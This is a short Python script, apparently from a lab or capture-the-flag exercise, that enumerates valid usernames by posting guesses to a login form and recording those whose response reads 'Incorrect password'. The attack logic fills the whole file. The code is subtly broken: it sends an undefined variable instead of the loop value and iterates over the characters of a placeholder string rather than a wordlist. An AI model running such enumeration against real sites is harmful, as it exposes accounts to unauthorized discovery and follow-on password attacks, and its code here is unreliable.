import requests

url = "link"
p_usernames = "wordlist"
valid_usernames = []
for user in p_usernames:
    login = requests.post(url, data={'username' : f'{username}', 'password': 'test'})
    
    if "Incorrect password" in login.text:
        valid_usernames.append(user)
        print(f'{valid_usernames[-1]}')